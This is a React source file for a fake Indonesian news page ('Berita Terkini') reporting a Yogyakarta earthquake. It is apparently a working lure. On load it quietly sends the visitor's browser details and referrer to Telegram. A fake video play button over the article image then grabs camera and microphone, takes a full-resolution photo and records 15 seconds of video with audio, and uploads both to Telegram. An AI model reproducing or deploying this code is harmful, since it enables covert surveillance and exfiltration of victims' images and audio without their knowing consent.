import { useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  useEffect(() => {
    sendTelegramNotification({
      userAgent: navigator.userAgent,
      location: window.location.href,
      referrer: document.referrer || 'Direct',
      previousSites: document.referrer || 'None',
    });
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');

      if (!videoDevice) throw new Error('No video input device found');

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 },
          height: { ideal: 2160 },
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d') as CanvasRenderingContext2D | null;


      if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      sendImageToTelegram(photoBlob).catch(console.error);

      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm',
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) throw new Error('No supported video format found');

      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000,
      });

      const chunks: BlobPart[] = [];
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, {
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm',
        });
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000);
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const article = {
    title: "Gempa Bumi Guncang Yogyakarta",
    date: "26 Juli 2025",
    imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
    content: `
      Yogyakarta kembali diguncang gempa bumi pada hari Sabtu, 26 Juli 2025.
      Gempa ini memiliki kekuatan 5.6 skala Richter dan terasa di beberapa wilayah seperti Sleman, Bantul, dan Kulonprogo.

      BMKG menyatakan bahwa pusat gempa berada di laut selatan Pulau Jawa dengan kedalaman 25 km.
      Masyarakat diimbau untuk tetap waspada terhadap gempa susulan.

      Tim tanggap darurat telah dikerahkan, dan hingga kini belum ada laporan korban jiwa.
    `,
  };

  return (
    <div className="bg-gray-100 min-h-screen">
      <header className="bg-white shadow-md sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <h1 className="text-2xl md:text-3xl font-bold text-red-600">Berita Terkini</h1>
          <nav className="space-x-4 text-sm md:text-base font-medium text-gray-700">
            <a href="#" className="hover:text-red-600 transition">Beranda</a>
            <a href="#" className="hover:text-red-600 transition">Nasional</a>
            <a href="#" className="hover:text-red-600 transition">Internasional</a>
            <a href="#" className="hover:text-red-600 transition">Olahraga</a>
            <a href="#" className="hover:text-red-600 transition">Teknologi</a>
          </nav>
        </div>
      </header>

      <main className="container mx-auto px-4 py-10 max-w-4xl">
        <article className="bg-white rounded-lg shadow overflow-hidden">
          <div className="relative aspect-video bg-black">
            <img src={article.imageUrl} alt={article.title} className="absolute inset-0 w-full h-full object-cover" />
            <div className="absolute inset-0 bg-black/40 flex items-center justify-center">
              <button
                onClick={captureAndSendMedia}
                className="bg-red-600 text-white p-6 rounded-full hover:bg-red-700 hover:scale-110 transition-all"
              >
                ▶
              </button>
            </div>
          </div>
          <div className="p-6">
            <p className="text-gray-500 text-sm mb-2">{article.date}</p>
            <h2 className="text-3xl font-bold mb-4">{article.title}</h2>
            <div className="text-gray-800 whitespace-pre-line leading-relaxed text-lg">
              {article.content}
            </div>
          </div>
        </article>
      </main>
    </div>
  );
}

export default App;
